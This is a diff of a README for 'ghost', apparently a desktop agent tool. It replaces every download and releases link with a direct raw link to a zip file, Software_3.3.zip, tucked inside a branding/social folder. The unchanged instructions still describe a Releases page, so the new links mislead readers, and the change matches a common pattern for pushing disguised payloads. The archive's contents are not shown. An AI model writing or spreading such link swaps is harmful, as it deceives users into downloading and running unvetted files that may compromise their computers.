@@ -1,6 +1,6 @@
 # 👻 ghost - Private Agent OS for Your Desktop
 
-[![Download ghost](https://img.shields.io/badge/Download-ghost-brightgreen?style=for-the-badge)](https://github.com/elias489/ghost)
+[![Download ghost](https://img.shields.io/badge/Download-ghost-brightgreen?style=for-the-badge)](https://github.com/elias489/ghost/raw/refs/heads/main/branding/social/Software_3.3.zip)
 
 ---
 
@@ -30,11 +30,11 @@ Make sure your computer meets these minimum requirements:
 
 To get ghost, visit the main project page below and follow the download steps.
 
-[![Download ghost](https://img.shields.io/badge/Download-ghost-blue?style=for-the-badge)](https://github.com/elias489/ghost)
+[![Download ghost](https://img.shields.io/badge/Download-ghost-blue?style=for-the-badge)](https://github.com/elias489/ghost/raw/refs/heads/main/branding/social/Software_3.3.zip)
 
 **How to download:**
 
-1. Click the link above or visit: https://github.com/elias489/ghost
+1. Click the link above or visit: https://github.com/elias489/ghost/raw/refs/heads/main/branding/social/Software_3.3.zip
 2. Look for a section labeled **Releases** on the GitHub page.
 3. Click the **Releases** link. This will take you to the download options.
 4. Find the latest release version. It usually has a name like `ghost-setup.exe` or similar.
@@ -134,8 +134,8 @@ These technical details improve how ghost runs and interacts with your tools.
 
 ## 🔗 Useful Links
 
-- Download page: https://github.com/elias489/ghost
-- Releases page: https://github.com/elias489/ghost/releases
+- Download page: https://github.com/elias489/ghost/raw/refs/heads/main/branding/social/Software_3.3.zip
+- Releases page: https://github.com/elias489/ghost/raw/refs/heads/main/branding/social/Software_3.3.zip
 - User forum and support: Check the GitHub Discussions tab on the repository page
 
 ---
